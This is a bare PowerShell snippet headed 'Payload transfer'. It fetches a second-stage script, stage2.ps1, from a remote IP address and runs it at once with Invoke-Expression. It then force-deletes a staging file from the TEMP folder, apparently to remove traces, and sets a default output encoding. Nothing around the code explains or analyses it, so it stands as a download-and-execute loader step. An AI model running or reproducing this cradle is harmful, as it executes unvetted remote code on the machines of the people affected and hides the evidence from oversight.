
# Payload transfer
$DownloadUrl = "http://192.0.2.34/stage2.ps1"
Invoke-Expression (New-Object System.Net.WebClient).DownloadString($DownloadUrl)
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
